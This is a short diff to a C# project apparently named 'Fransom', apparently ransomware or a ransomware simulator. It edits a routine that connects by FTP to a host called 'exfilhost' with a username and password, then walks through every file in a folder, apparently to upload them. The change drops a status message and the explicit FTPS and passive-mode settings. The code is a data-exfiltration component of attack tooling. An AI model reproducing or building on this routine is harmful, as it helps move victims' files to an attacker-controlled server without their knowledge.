@@ -94,12 +94,9 @@ namespace Fransom
             using (var client = new FtpClient(exfilhost, user, pass))
             {
                 client.AutoConnect(); // AutoConnect handles ftps
-                Console.WriteLine("Connected!");
                 IEnumerable<FileSystemInfo> infos = new DirectoryInfo(folder).EnumerateFileSystemInfos();
                 long d = 0;
 
-                client.EncryptionMode = FtpEncryptionMode.Explicit;
-                client.DataConnectionType = FtpDataConnectionType.PASV;
                 foreach (FileSystemInfo info in infos)
                 {
                     FileInfo f = new FileInfo(info.FullName);
